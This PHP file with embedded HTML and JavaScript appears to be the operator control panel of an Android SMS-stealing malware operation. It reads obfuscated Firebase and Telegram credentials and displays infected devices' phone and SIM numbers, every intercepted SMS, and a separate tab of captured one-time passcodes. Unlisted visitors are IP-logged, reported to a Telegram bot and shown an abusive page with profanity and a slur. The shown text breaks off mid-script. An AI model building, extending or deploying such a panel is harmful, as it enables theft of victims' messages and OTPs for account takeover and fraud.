<?php
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '512M');

// ====== 🔒 ENCRYPTED FIREBASE CONFIG (XOR + BASE64) ======
define('ENC_KEY', 'AlexaAdmin2024!@#');
define('ENC_DB_URL', 'KRgRCBJ7S0IOCVVXVVMMeRR4DgFVBSQCDBwCRh1AQEUiDScFFx0DIBcIAAEcU11Z');
define('ENC_BOT_TOKEN', 'eVtRQFB4UVlYXAhxc3xRJkQLAgFMIhtUA1AnUHECDXAFSQ4rCi4JeAYUIVpXCA==');

function decrypt($enc) {
  $data = base64_decode($enc);
  $out = '';
  $k = ENC_KEY;
  $l = strlen($k);
  for ($i = 0; $i < strlen($data); $i++) $out .= chr(ord($data[$i]) ^ ord($k[$i % $l]));
  return $out;
}

define('FIREBASE_DB', decrypt(ENC_DB_URL));
define('BOT_TOKEN', decrypt(ENC_BOT_TOKEN));

// ====== IP DETECTIVE ======
function getRealIP() {
  foreach (['HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','HTTP_CLIENT_IP','HTTP_X_FORWARDED','HTTP_FORWARDED_FOR','REMOTE_ADDR'] as $k) {
    if (!empty($_SERVER[$k])) {
      $ip = explode(',', $_SERVER[$k])[0];
      if (filter_var(trim($ip), FILTER_VALIDATE_IP)) return trim($ip);
    }
  }
  return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function fetchURL($url, $timeout = 8) {
  if (!function_exists('curl_init')) return @file_get_contents($url);
  $ch = curl_init($url);
  curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => $timeout, CURLOPT_CONNECTTIMEOUT => 4, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_FOLLOWLOCATION => true]);
  $r = curl_exec($ch);
  curl_close($ch);
  return $r;
}

function fb($path) {
  return json_decode(fetchURL(FIREBASE_DB . '/' . ltrim($path, '/') . '.json'), true) ?: [];
}

function fbPut($path, $data) {
  $u = FIREBASE_DB . '/' . ltrim($path, '/') . '.json';
  $j = json_encode($data);
  $ch = curl_init($u);
  curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_CUSTOMREQUEST => 'PUT', CURLOPT_POSTFIELDS => $j, CURLOPT_HTTPHEADER => ['Content-Type: application/json'], CURLOPT_TIMEOUT => 8, CURLOPT_SSL_VERIFYPEER => false]);
  curl_exec($ch);
  curl_close($ch);
}

function botSend($text) {
  if (!BOT_TOKEN || BOT_TOKEN === '') return;
  $chatId = fb('panel/bot_chat_id');
  if (!$chatId) return;
  $d = json_encode(['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML']);
  $ch = curl_init('https://api.telegram.org/bot' . BOT_TOKEN . '/sendMessage');
  curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $d, CURLOPT_HTTPHEADER => ['Content-Type: application/json'], CURLOPT_TIMEOUT => 5, CURLOPT_SSL_VERIFYPEER => false]);
  curl_exec($ch);
  curl_close($ch);
}

// ====== IP CHECK ======
$visitorIP = getRealIP();
$allowedIPs = fb('panel/allowed_ips');
if (!is_array($allowedIPs)) $allowedIPs = [];
$isAllowed = in_array($visitorIP, $allowedIPs) || in_array('*', $allowedIPs);

// Log visitor
$visitors = fb('panel/visitors');
if (!is_array($visitors)) $visitors = [];
$visitors[time() . '_' . rand(100,999)] = [
  'ip' => $visitorIP,
  'ua' => substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 100),
  'time' => date('Y-m-d H:i:s'),
  'allowed' => $isAllowed ? 1 : 0
];
if (count($visitors) > 100) $visitors = array_slice($visitors, -100, null, true);
fbPut('panel/visitors', $visitors);

// Notify bot on intrusion
if (!$isAllowed) botSend("🚨 <b>Intrusion!</b>\n👤 IP: <code>$visitorIP</code>\n⏰ " . date('Y-m-d H:i:s') . "\n❌ Blocked");

// ====== AJAX HANDLER ======
$ajax = $_GET['ajax'] ?? '';
if ($ajax) {
  header('Content-Type: application/json; charset=utf-8');
  
  if ($ajax === 'devices') {
    $raw = fb('user_data');
    $devices = [];
    if (is_array($raw)) {
      foreach ($raw as $id => $d) {
        if (!is_array($d)) continue;
        $d['_id'] = $id;
        $devices[$id] = $d;
      }
    }
    $on = 0; $off = 0;
    foreach ($devices as $d) { if (($d['status']??'') === 'online') $on++; else $off++; }
    echo json_encode(['devices' => $devices, 'online' => $on, 'offline' => $off, 'total' => count($devices)]);
    exit;
  }
  
  if ($ajax === 'sms') {
    $raw = fb('user_sms');
    $sms = [];
    if (is_array($raw)) {
      foreach ($raw as $devId => $msgs) {
        if (!is_array($msgs)) continue;
        foreach ($msgs as $k => $v) {
          if (!is_array($v)) continue;
          $sender = $v['sender'] ?? $v['senderNumber'] ?? $v['from'] ?? $v['address'] ?? '';
          $body = $v['body'] ?? $v['msg'] ?? $v['message'] ?? $v['text'] ?? $v['content'] ?? '';
          if ($body) {
            $sms[] = ['sender' => $sender, 'body' => $body, 'date' => $v['timestamp'] ?? $v['date'] ?? '', '_dev' => $devId];
          }
        }
      }
    }
    usort($sms, function($a, $b) { return ($b['date']??0) - ($a['date']??0); });
    echo json_encode($sms);
    exit;
  }
  
  if ($ajax === 'ping') {
    $start = microtime(true);
    $raw = fb('panel/allowed_ips'); // lightweight check
    $ms = round((microtime(true) - $start) * 1000);
    echo json_encode(['ok' => true, 'ping' => $ms, 'php' => PHP_VERSION]);
    exit;
  }
  
  echo json_encode(['error' => 'Unknown action']);
  exit;
}

// ====== NOT ALLOWED - FUCK YOU PAGE ======
if (!$isAllowed):
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>🚫 ACCESS DENIED</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Orbitron',monospace;overflow:hidden;position:relative}
.bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;overflow:hidden}
.bg span{position:absolute;border-radius:50%;animation:intrude 8s infinite ease-in-out}
.bg span:nth-child(1){width:700px;height:700px;background:radial-gradient(circle,rgba(255,0,0,.12),transparent);top:-20%;left:-20%;animation-delay:0s}
.bg span:nth-child(2){width:600px;height:600px;background:radial-gradient(circle,rgba(200,0,0,.08),transparent);bottom:-25%;right:-15%;animation-delay:-3s}
.bg span:nth-child(3){width:400px;height:400px;background:radial-gradient(circle,rgba(255,50,0,.06),transparent);top:30%;left:50%;animation-delay:-6s}
@keyframes intrude{0%,100%{transform:translate(0,0) scale(1)}25%{transform:translate(50px,-60px) scale(1.08)}50%{transform:translate(-40px,50px) scale(.92)}75%{transform:translate(30px,40px) scale(1.04)}}
.container{position:relative;z-index:1;text-align:center;padding:40px;animation:popIn .8s cubic-bezier(.34,1.56,.64,1)}
@keyframes popIn{0%{opacity:0;transform:scale(.3) rotate(-10deg)}100%{opacity:1;transform:scale(1) rotate(0deg)}}
.emoji-big{font-size:120px;display:block;margin-bottom:10px;animation:bounce 1.5s infinite;filter:drop-shadow(0 0 60px rgba(255,0,0,.3))}
@keyframes bounce{0%,100%{transform:translateY(0) scale(1)}30%{transform:translateY(-30px) scale(1.1)}50%{transform:translateY(0) scale(1)}70%{transform:translateY(-15px) scale(1.05)}}
.msg1{font-size:72px;font-weight:900;background:linear-gradient(135deg,#ff0044,#ff2200,#ff0044);background-size:200% 200%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:gradientShift 2s ease infinite,glitch 3s infinite;letter-spacing:-2px;display:inline-block}
@keyframes gradientShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
@keyframes glitch{0%,90%,100%{transform:translate(0)}92%{transform:translate(-5px,3px) skewX(-2deg)}94%{transform:translate(5px,-3px) skewX(2deg)}96%{transform:translate(-3px,0) skewX(-1deg)}98%{transform:translate(3px,-2px) skewX(1deg)}}
.msg2{font-size:36px;font-weight:700;color:#ff4444;margin:15px 0 25px;animation:shake .5s infinite;text-shadow:0 0 20px rgba(255,0,0,.3)}
@keyframes shake{0%,100%{transform:translate(0)}25%{transform:translate(-8px,4px) rotate(-1deg)}50%{transform:translate(8px,-4px) rotate(1deg)}75%{transform:translate(-4px,2px)}}
.sub-msg{color:rgba(255,100,100,.4);font-size:14px;letter-spacing:6px;text-transform:uppercase;margin-top:10px;animation:fadePulse 2s infinite}
@keyframes fadePulse{0%,100%{opacity:.4}50%{opacity:.1}}
.ip-info{margin-top:30px;padding:16px 24px;background:rgba(255,0,0,.04);border:1px solid rgba(255,0,0,.1);border-radius:12px;display:inline-block;animation:fadeUp 1s ease-out}
@keyframes fadeUp{0%{opacity:0;transform:translateY(20px)}100%{opacity:1;transform:translateY(0)}}
.ip-info span{display:block;font-size:11px;color:rgba(255,100,100,.3);letter-spacing:2px;margin-bottom:6px}
.ip-info strong{font-size:16px;color:#ff4444;letter-spacing:1px}
.scanlines{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:2;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,0,0,.02) 2px,rgba(255,0,0,.02) 4px);animation:scanMove 8s linear infinite}
@keyframes scanMove{0%{background-position:0 0}100%{background-position:0 100px}}
.particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;overflow:hidden}
.p{position:absolute;width:4px;height:4px;background:rgba(255,0,0,.3);border-radius:50%;animation:fall linear infinite}
.p:nth-child(1){left:10%;animation-duration:4s;animation-delay:0s}
.p:nth-child(2){left:25%;animation-duration:5s;animation-delay:1s}
.p:nth-child(3){left:40%;animation-duration:3.5s;animation-delay:.5s}
.p:nth-child(4){left:55%;animation-duration:4.5s;animation-delay:2s}
.p:nth-child(5){left:70%;animation-duration:6s;animation-delay:0s}
.p:nth-child(6){left:85%;animation-duration:3.8s;animation-delay:1.5s}
.p:nth-child(7){left:50%;animation-duration:5.2s;animation-delay:.8s}
.p:nth-child(8){left:15%;animation-duration:4.2s;animation-delay:2.5s}
@keyframes fall{0%{transform:translateY(-10px) scale(1);opacity:1}100%{transform:translateY(100vh) scale(0);opacity:0}}
.crt::after{content:'';position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:3;animation:flicker .15s infinite;background:rgba(0,0,0,.02)}
@keyframes flicker{0%{opacity:.03}50%{opacity:0}100%{opacity:.02}}
.footer-ip{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);z-index:5;color:rgba(255,50,50,.2);font-size:9px;letter-spacing:3px;text-transform:uppercase}
</style>
</head>
<body class="crt">
<div class="bg"><span></span><span></span><span></span></div>
<div class="scanlines"></div>
<div class="particles"><div class="p"></div><div class="p"></div><div class="p"></div><div class="p"></div><div class="p"></div><div class="p"></div><div class="p"></div><div class="p"></div></div>
<div class="container">
  <div style="font-size:60px;margin-bottom:10px;animation:bounce 1.5s infinite">🖕</div>
  <div class="msg1">FUCK YOU</div>
  <div class="msg2">🤬 NIKAL JA LAWDE 🤬</div>
  <div class="sub-msg">⛔ Unauthorized Access Detected ⛔</div>
  <div class="ip-info">
    <span>📡 YOUR IP HAS BEEN LOGGED</span>
    <strong><?php echo htmlspecialchars($visitorIP); ?></strong>
  </div>
</div>
<div class="footer-ip">🔒 Alexa Admin • IP Detective Active</div>
<script>
setInterval(function(){
  var m = document.querySelector('.msg2');
  if(m){ m.style.animation='none'; m.offsetHeight; m.style.animation='shake .5s infinite'; }
}, 4000);
</script>
</body>
</html>
<?php exit; endif; ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Alexa Admin • Command Center</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#080812;color:#e0e0f0;min-height:100vh;overflow-x:hidden}
.bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;overflow:hidden;pointer-events:none}
.bg-grid{position:absolute;top:0;left:0;width:100%;height:100%;background-image:linear-gradient(rgba(108,60,240,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(108,60,240,.03) 1px,transparent 1px);background-size:60px 60px;animation:gridMove 8s linear infinite}
@keyframes gridMove{0%{transform:translate(0,0)}100%{transform:translate(60px,60px)}}
.bg-orb{position:absolute;border-radius:50%;animation:orbFloat 20s infinite ease-in-out}
.bg-orb:nth-child(2){width:600px;height:600px;background:radial-gradient(circle,rgba(108,60,240,.08),transparent);top:-10%;left:-10%;animation-delay:0s}
.bg-orb:nth-child(3){width:500px;height:500px;background:radial-gradient(circle,rgba(26,159,255,.06),transparent);bottom:-15%;right:-10%;animation-delay:-7s}
.bg-orb:nth-child(4){width:350px;height:350px;background:radial-gradient(circle,rgba(240,60,160,.04),transparent);top:40%;left:60%;animation-delay:-14s}
@keyframes orbFloat{0%,100%{transform:translate(0,0) scale(1)}25%{transform:translate(60px,-40px) scale(1.05)}50%{transform:translate(-30px,60px) scale(.95)}75%{transform:translate(40px,30px) scale(1.02)}}
.glass{background:rgba(255,255,255,.025);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border:1px solid rgba(255,255,255,.05);border-radius:14px;transition:all .3s cubic-bezier(.4,0,.2,1)}
.glass:hover{border-color:rgba(255,255,255,.09);transform:translateY(-1px)}
.head{position:relative;z-index:1;padding:20px 28px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,.04);flex-wrap:wrap;gap:12px}
.head-l{display:flex;align-items:center;gap:14px}
.head-l .logo{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,#6c3cf0,#1a9fff);display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900;color:#fff;position:relative;overflow:hidden}
.head-l .logo::after{content:'';position:absolute;width:100%;height:100%;background:linear-gradient(135deg,transparent 40%,rgba(255,255,255,.1) 50%,transparent 60%);animation:logoShine 3s infinite}
@keyframes logoShine{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
.head-l h1{font-size:22px;font-weight:800;letter-spacing:-.5px;background:linear-gradient(135deg,#6c3cf0,#1a9fff,#f03c9f);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-size:200% auto;animation:gradText 4s linear infinite}
@keyframes gradText{0%,100%{background-position:0% center}50%{background-position:100% center}}
.head-l .tag{font-size:9px;color:rgba(255,255,255,.2);letter-spacing:4px;text-transform:uppercase;margin-top:-2px}
.head-r{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.h-btn{padding:8px 16px;border-radius:8px;border:1px solid rgba(255,255,255,.06);background:rgba(255,255,255,.03);color:rgba(255,255,255,.6);font-size:11px;cursor:pointer;transition:all .3s;font-family:inherit;font-weight:500}
.h-btn:hover{background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.1)}
.h-btn.prim{background:linear-gradient(135deg,#6c3cf0,#4a1fc0);border:none;color:#fff}
.h-btn.prim:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(108,60,240,.2)}
.h-info{font-size:11px;color:rgba(255,255,255,.35);padding:6px 12px;background:rgba(255,255,255,.02);border-radius:6px;border:1px solid rgba(255,255,255,.03)}
.ip-badge{font-size:10px;padding:4px 10px;background:rgba(30,200,100,.08);color:#1ec864;border-radius:5px;border:1px solid rgba(30,200,100,.1);display:flex;align-items:center;gap:4px}
.ip-badge .dot{width:6px;height:6px;border-radius:50%;background:#1ec864;animation:pulse 2s infinite}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;padding:16px 28px;position:relative;z-index:1}
.s-card{padding:18px 16px;text-align:center;position:relative;overflow:hidden;animation:cardPop .4s ease-out both}
.s-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;border-radius:0 0 2px 2px}
.s-card.tot{--sg:rgba(108,60,240,.08)}.s-card.tot::before{background:linear-gradient(90deg,#6c3cf0,#1a9fff)}
.s-card.on{--sg:rgba(30,200,100,.08)}.s-card.on::before{background:linear-gradient(90deg,#1ec864,#10b060)}
.s-card.off{--sg:rgba(240,60,108,.08)}.s-card.off::before{background:linear-gradient(90deg,#f03c6c,#d03050)}
.s-card.ping{--sg:rgba(240,180,30,.08)}.s-card.ping::before{background:linear-gradient(90deg,#f0b41e,#f08010)}
.s-card.sms{--sg:rgba(240,60,160,.08)}.s-card.sms::before{background:linear-gradient(90deg,#f03ca0,#c03080)}
.s-card:nth-child(1){animation-delay:.0s}
.s-card:nth-child(2){animation-delay:.05s}
.s-card:nth-child(3){animation-delay:.1s}
.s-card:nth-child(4){animation-delay:.15s}
.s-card:nth-child(5){animation-delay:.2s}
@keyframes cardPop{from{opacity:0;transform:translateY(12px) scale(.95)}to{opacity:1;transform:translateY(0) scale(1)}}
.s-num{font-size:32px;font-weight:800;line-height:1;margin-bottom:4px;font-variant-numeric:tabular-nums}
.s-lbl{font-size:9px;color:rgba(255,255,255,.3);letter-spacing:2px;text-transform:uppercase}
.tab-bar{display:flex;gap:4px;padding:0 28px;position:relative;z-index:1;overflow-x:auto;scrollbar-width:none}
.tab-bar::-webkit-scrollbar{display:none}
.tab-btn{padding:10px 20px;border-radius:8px 8px 0 0;border:none;background:transparent;color:rgba(255,255,255,.3);font-size:12px;font-weight:500;cursor:pointer;transition:all .3s;font-family:inherit;white-space:nowrap;position:relative}
.tab-btn:hover{color:rgba(255,255,255,.6)}
.tab-btn.active{color:#fff;background:rgba(255,255,255,.03)}
.tab-btn.active::after{content:'';position:absolute;bottom:0;left:20%;width:60%;height:2px;background:linear-gradient(90deg,#6c3cf0,#1a9fff);border-radius:2px}
.content{padding:16px 28px 40px;position:relative;z-index:1}
.tab-p{display:none;animation:fadeTab .3s ease-out}
.tab-p.active{display:block}
@keyframes fadeTab{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
.toolbar{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap;align-items:center}
.toolbar input{flex:1;min-width:180px;padding:10px 14px;border:1px solid rgba(255,255,255,.04);border-radius:8px;background:rgba(255,255,255,.025);color:#fff;font-size:12px;font-family:inherit;outline:none;transition:all .3s}
.toolbar input:focus{border-color:rgba(108,60,240,.2);box-shadow:0 0 0 3px rgba(108,60,240,.06)}
.toolbar .f-btn{padding:8px 14px;border:1px solid rgba(255,255,255,.04);border-radius:8px;background:rgba(255,255,255,.02);color:rgba(255,255,255,.4);font-size:11px;cursor:pointer;transition:all .3s;font-family:inherit}
.toolbar .f-btn:hover{background:rgba(255,255,255,.05);color:rgba(255,255,255,.7)}
.toolbar .f-btn.act{border-color:rgba(108,60,240,.2);background:rgba(108,60,240,.08);color:#6c3cf0}
.toolbar .p{font-size:11px;color:rgba(255,255,255,.25);padding:6px 10px}
.d-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
.d-card{padding:16px;cursor:pointer;position:relative;overflow:hidden;animation:cardIn .3s ease-out both}
.d-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;border-radius:0 3px 3px 0}
.d-card.on::before{background:linear-gradient(180deg,#1ec864,#10b060)}
.d-card.off::before{background:linear-gradient(180deg,#f03c6c,#d03050)}
.d-card .d-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px}
.d-card .d-name{font-size:13px;font-weight:600;color:#fff}
.d-card .d-status{font-size:9px;padding:3px 8px;border-radius:4px;font-weight:500;letter-spacing:.5px}
.d-card.on .d-status{background:rgba(30,200,100,.1);color:#1ec864}
.d-card.off .d-status{background:rgba(240,60,108,.1);color:#f03c6c}
.d-card .d-row{display:grid;grid-template-columns:1fr 1fr;gap:4px 12px;font-size:11px;color:rgba(255,255,255,.4)}
.d-card .d-row>div{padding:4px 0;border-top:1px solid rgba(255,255,255,.03)}
.d-card .d-row strong{color:rgba(255,255,255,.7);font-weight:500}
.d-card .d-row .full{grid-column:1/-1}
.d-card .d-bat{margin-top:6px}
.d-card .d-bat .b-bar{height:4px;background:rgba(255,255,255,.05);border-radius:2px;overflow:hidden}
.d-card .d-bat .b-fill{height:100%;border-radius:2px;transition:width .5s ease}
.d-card .d-bat .b-fill.hi{background:linear-gradient(90deg,#1ec864,#10b060)}
.d-card .d-bat .b-fill.md{background:linear-gradient(90deg,#f0b41e,#f08010)}
.d-card .d-bat .b-fill.lo{background:linear-gradient(90deg,#f03c6c,#d03050)}
.d-card .d-nums{display:flex;gap:4px;flex-wrap:wrap;margin-top:6px}
.d-card .d-nums .sim-b{padding:2px 8px;border-radius:3px;font-size:9px;font-weight:500}
.sim-jio{background:rgba(30,200,100,.08);color:#1ec864}
.sim-air{background:rgba(26,159,255,.08);color:#1a9fff}
.sim-vi{background:rgba(240,60,160,.08);color:#f03ca0}
.sim-bs{background:rgba(240,180,30,.08);color:#f0b41e}
.sim-oth{background:rgba(255,255,255,.04);color:rgba(255,255,255,.4)}
.d-card .d-last{font-size:9px;color:rgba(255,255,255,.15);margin-top:4px}
.sms-l{display:flex;flex-direction:column;gap:6px}
.sms-i{padding:12px 14px;animation:cardIn .2s ease-out both}
.sms-i .s-sender{font-size:12px;font-weight:600;color:#fff}
.sms-i .s-via{font-size:9px;color:rgba(255,255,255,.2);margin:2px 0}
.sms-i .s-via .v-link{cursor:pointer;color:rgba(108,60,240,.5)}
.sms-i .s-via .v-link:hover{color:#6c3cf0}
.sms-i .s-body{font-size:12px;color:rgba(255,255,255,.6);margin:4px 0;line-height:1.4;word-break:break-word}
.sms-i .s-btm{display:flex;gap:8px;align-items:center;font-size:10px;color:rgba(255,255,255,.2)}
.sms-i .s-otp{padding:2px 8px;border-radius:4px;font-weight:600;font-size:11px;cursor:pointer;background:rgba(240,60,160,.08);color:#f03ca0}
.sms-e{text-align:center;padding:40px 20px;color:rgba(255,255,255,.15);font-size:13px}
.load{text-align:center;padding:40px;color:rgba(255,255,255,.15);font-size:12px}
.load .sp{width:24px;height:24px;margin:0 auto 10px;border:2px solid rgba(255,255,255,.04);border-top-color:#6c3cf0;border-radius:50%;animation:spin .6s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes cardIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.pulse{animation:pulse 2s infinite}
</style>
</head>
<body>
<div class="bg"><div class="bg-grid"></div><div class="bg-orb"></div><div class="bg-orb"></div><div class="bg-orb"></div></div>

<div class="head">
  <div class="head-l">
    <div class="logo">AA</div>
    <div><h1>Alexa Admin</h1><div class="tag">⚡ Command Center ⚡</div></div>
  </div>
  <div class="head-r">
    <span class="ip-badge"><span class="dot"></span> <?php echo htmlspecialchars($visitorIP); ?></span>
    <span class="h-info" id="hInfo">--</span>
    <button class="h-btn prim" onclick="loadAll()">⟳ Sync</button>
  </div>
</div>

<div class="stats" id="statsBar">
  <div class="s-card tot glass"><div class="s-num" id="sTot">-</div><div class="s-lbl">📱 Devices</div></div>
  <div class="s-card on glass"><div class="s-num" id="sOn">-</div><div class="s-lbl">🟢 Online</div></div>
  <div class="s-card off glass"><div class="s-num" id="sOff">-</div><div class="s-lbl">🔴 Offline</div></div>
  <div class="s-card ping glass"><div class="s-num" id="sPing">-</div><div class="s-lbl">📡 Ping</div></div>
  <div class="s-card sms glass"><div class="s-num" id="sSms">-</div><div class="s-lbl">💬 SMS</div></div>
</div>

<div class="tab-bar">
  <button class="tab-btn active" onclick="switchTab('devices',this)">📱 Devices</button>
  <button class="tab-btn" onclick="switchTab('sms',this)">💬 All SMS</button>
  <button class="tab-btn" onclick="switchTab('otp',this)">🔑 OTPs</button>
  <button class="tab-btn" onclick="switchTab('sims',this)">📞 SIM Numbers</button>
</div>

<div class="content">
  <div class="tab-p active" id="tDevices">
    <div class="toolbar">
      <input id="sBox" placeholder="Search name, phone, ID..." oninput="applyFilter()">
      <button class="f-btn act" id="fAll" onclick="setF('all',this)">All</button>
      <button class="f-btn" id="fOn" onclick="setF('online',this)">Online</button>
      <button class="f-btn" id="fOff" onclick="setF('offline',this)">Offline</button>
    </div>
    <div class="d-grid" id="dGrid"></div>
  </div>
  <div class="tab-p" id="tSms">
    <div class="toolbar">
      <input id="smsS" placeholder="Search SMS..." oninput="filterSms()">
      <span class="p" id="smsP">-</span>
    </div>
    <div class="sms-l" id="smsL"></div>
  </div>
  <div class="tab-p" id="tOtp">
    <div class="toolbar">
      <input id="otpS" placeholder="Search OTP..." oninput="filterOtp()">
      <span class="p" id="otpP">-</span>
    </div>
    <div class="sms-l" id="otpL"></div>
  </div>
  <div class="tab-p" id="tSims">
    <div class="toolbar">
      <input id="simS" placeholder="Search number..." oninput="filterSims()">
      <button class="f-btn" id="fsAll" onclick="setSimF('all',this)">All</button>
      <button class="f-btn" id="fsOn" onclick="setSimF('online',this)">Online Only</button>
      <span class="p" id="simP">-</span>
    </div>
    <div class="d-grid" id="simGrid"></div>
  </div>
</div>

<div id="toast" style="position:fixed;bottom:30px;left:50%;transform:translateX(-50%);z-index:200;padding:10px 24px;border-radius:8px;font-size:12px;font-weight:500;background:rgba(0,0,0,.7);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,.06);color:#fff;display:none;animation:fadeUp .2s"></div>

<script>
var DEV = {}, DLIST = [], FILTER = 'all', SIMF = 'all';
var SMS_CACHE = [], OTP_CACHE = [], SIMS_CACHE = [];
var polling = null;

function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') }
function show(m){ var t=document.getElementById('toast'); t.textContent=m; t.style.display='block'; setTimeout(function(){t.style.display='none'},2000) }

function ajax(action){
  return fetch('panel.php?ajax='+encodeURIComponent(action)).then(function(r){if(!r.ok)return null;return r.json()}).catch(function(){return null})
}

function loadAll(){
  document.getElementById('hInfo').textContent='Loading...';
  document.getElementById('dGrid').innerHTML='<div class="load"><div class="sp"></div></div>';
  Promise.all([ajax('devices'), ajax('sms'), ajax('ping')]).then(function(r){
    var dd=r[0], sm=r[1], pg=r[2];
    if(!dd||!dd.devices){document.getElementById('dGrid').innerHTML='<div class="sms-e">Connection Error</div>';document.getElementById('hInfo').textContent='Error';return}
    DEV=dd.devices;
    DLIST=Object.keys(DEV).map(function(id){return{id:id,dev:DEV[id]}});
    document.getElementById('sTot').textContent=dd.total||DLIST.length;
    document.getElementById('sOn').textContent=dd.online||0;
    document.getElementById('sOff').textContent=dd.offline||0;
    document.getElementById('hInfo').textContent=DLIST.length+' devices';
    if(pg&&pg.ping) document.getElementById('sPing').textContent=pg.ping+'ms';
    applyFilter();
    if(sm){SMS_CACHE=sm||[];document.getElementById('sSms').textContent=SMS_CACHE.length;filterSms();buildSims()}
  });
}

// ====== DEVICES ======
function applyFilter(){
  var q=document.getElementById('sBox').value.toLowerCase();
  var list=DLIST;
  if(FILTER==='online')list=list.filter(function(i){return i.dev.status==='online'});
  else if(FILTER==='offline')list=list.filter(function(i){return i.dev.status!=='online'});
  if(q)list=list.filter(function(i){var d=i.dev;return(i.id+' '+ph(d)+' '+(d.d_name||'')+' '+sn(d)+' '+(d.numberSim1||'')+' '+(d.numberSim2||'')).toLowerCase().includes(q)});
  var html='';
  list.forEach(function(i){
    var d=i.dev,id=i.id,p=ph(d)||'-',st=d.status||'offline',b=parseInt(d.battery||d.battery_level||0)||0;
    var model=d.d_name||'Device',nm=sn(d),n1=d.numberSim1||'',n2=d.numberSim2||'',bc=b>50?'hi':b>20?'md':'lo',si=simOp(nm||p),last=d.TimeandDate||'';
    html+='<div class="d-card glass '+st+'"><div class="d-top"><div class="d-name">'+esc(model)+'</div><div class="d-status">'+st+'</div></div>'
      +'<div class="d-row"><div>Phone: <strong>'+esc(p)+'</strong></div><div>Battery: <strong>'+b+'%</strong></div>';
    if(n1)html+='<div>SIM1: <strong>'+esc(n1)+'</strong></div>';
    if(n2)html+='<div>SIM2: <strong>'+esc(n2)+'</strong></div>';
    if(nm)html+='<div>Operator: <strong>'+esc(nm)+'</strong></div>';
    html+='<div class="full" style="font-size:10px;opacity:.3">ID: '+esc(id)+'</div></div>';
    if(nm||p)html+='<div class="d-nums">'+(p?'<span class="sim-b '+si+'">'+esc(nm||p)+'</span>':'')+'</div>';
    html+='<div class="d-bat"><div class="b-bar"><div class="b-fill '+bc+'" style="width:'+b+'%"></div></div></div>';
    if(last)html+='<div class="d-last">Last: '+esc(last)+'</div></div>';
  });
  if(!list.length)html='<div class="sms-e">No devices match</div>';
  document.getElementById('dGrid').innerHTML=html;
}

function setF(f,btn){FILTER=f;document.querySelectorAll('#tDevices .f-btn').forEach(function(b){b.classList.remove('act')});if(btn)btn.classList.add('act');applyFilter()}

function ph(d){var f=['phoneNumber','number','numberSim1','sim1','PhoneNumber','phone','mobile','number1','simNumber','mobNo','sim1Number'];for(var i=0;i<f.length;i++){var v=(d[f[i]]||'').trim();if(v&&v!=='Not Available'&&v!=='No Data'&&v!=='No SIM Found'&&v!=='Unknown'&&v!==''&&v!=='Restricted')return v}return ''}
function sn(d){var f=['nameSim1','name1','sim1Name','sim1Carrier','operator1','operator','carrierName','nameSim2','sim2Name','sim2Carrier'];for(var i=0;i<f.length;i++){var v=(d[f[i]]||'').trim();if(v&&v!=='Not Available'&&v!=='No Data'&&v!=='Unknown'&&v!=='')return v}return ''}
